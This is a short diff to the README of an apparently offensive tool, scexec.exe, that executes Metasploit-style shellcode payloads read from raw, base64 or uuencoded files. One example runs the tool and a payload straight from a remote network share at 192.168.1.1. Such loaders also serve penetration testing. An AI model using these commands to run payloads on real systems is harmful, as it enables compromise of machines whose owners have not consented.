@@ -40,17 +40,17 @@ Examples
 
 ## Few more quick examples
 
-Read payload from filename msfpayloadfn:
+Read payload from filename msfpayloadfn.raw:
 
-    C:\> scexec.exe f <msfpayloadfn>
+    C:\> scexec.exe f msfpayloadfn.raw
 
-Read base64 encoded payload from filename msfpayloadfn:
+Read base64 encoded payload from filename msfpayloadfn.base64:
 
-    C:\> scexec.exe fb <msfpayloadfn>
+    C:\> scexec.exe fb msfpayloadfn.base64
 
-Read base64 payload from share:
+Read and execute uuencoded payload from share:
 
-    C:\> \\192.168.1.1\\scexec.exe f \\192.168.1.1\\msfpayload.raw
+    C:\> \\192.168.1.1\\scexec.exe fu \\192.168.1.1\\msfpayload.uuencoded
 
 Options explained
 =================
